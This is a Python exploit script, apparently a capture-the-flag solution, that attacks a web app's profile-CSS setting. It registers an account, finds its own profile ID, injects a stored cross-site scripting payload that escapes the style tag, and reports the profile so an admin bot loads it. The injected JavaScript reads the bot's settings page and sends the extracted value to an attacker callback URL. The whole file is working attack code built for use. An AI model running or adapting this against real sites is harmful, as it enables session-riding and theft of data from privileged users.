#!/usr/bin/env python3
import requests
import time

TARGET   = "http://TARGET:PORT"
CALLBACK = "https://YOUR_CALLBACK_URL"
BOT_BASE = "http://localhost:5000"

sess = requests.Session()
USERNAME = f"xss_{int(time.time())}"
PASSWORD = "exploit123"
DISPLAY  = "XSSTest"


def register_and_login():
    sess.post(f"{TARGET}/register", data={
        'username': USERNAME, 'display_name': DISPLAY, 'password': PASSWORD,
    }, timeout=15)
    r = sess.post(f"{TARGET}/login", data={
        'username': USERNAME, 'password': PASSWORD,
    }, allow_redirects=True, timeout=15)
    return 'Feed' in r.text or '/feed' in r.url


def find_our_uid():
    for uid in range(1, 50):
        r = sess.get(f"{TARGET}/profile/{uid}", timeout=8)
        if r.status_code == 200 and DISPLAY in r.text:
            return uid
    return -1


def set_xss_css():
    js = (
        "fetch('/settings').then(r=>r.text()).then(t=>{"
        "var x=t.split('Username:')[1].split('</p>')[0];"
        "new Image().src='" + CALLBACK + "/?f='+encodeURIComponent(x)"
        "})"
    )
    css_payload = (
        '@import url("\\3c /style\\3e \\3c script\\3e '
        + js +
        '\\3c /script\\3e \\3c style\\3e ");'
    )
    r = sess.post(f"{TARGET}/settings/css",
                  data={'profile_css': css_payload},
                  allow_redirects=True, timeout=15)
    return r.status_code == 200


def report_profile(uid):
    url = f"{BOT_BASE}/profile/{uid}"
    r = sess.post(f"{TARGET}/report",
                  data={'link': url},
                  allow_redirects=True, timeout=15)
    return r.status_code == 200


def main():
    assert register_and_login(), "Login failed"
    uid = find_our_uid()
    assert uid > 0, "Could not find our user_id"
    assert set_xss_css(), "CSS update failed"
    assert report_profile(uid), "Report failed"
    print(f"[+] Done! Check {CALLBACK} for ?f= parameter containing the flag")


if __name__ == '__main__':
    main()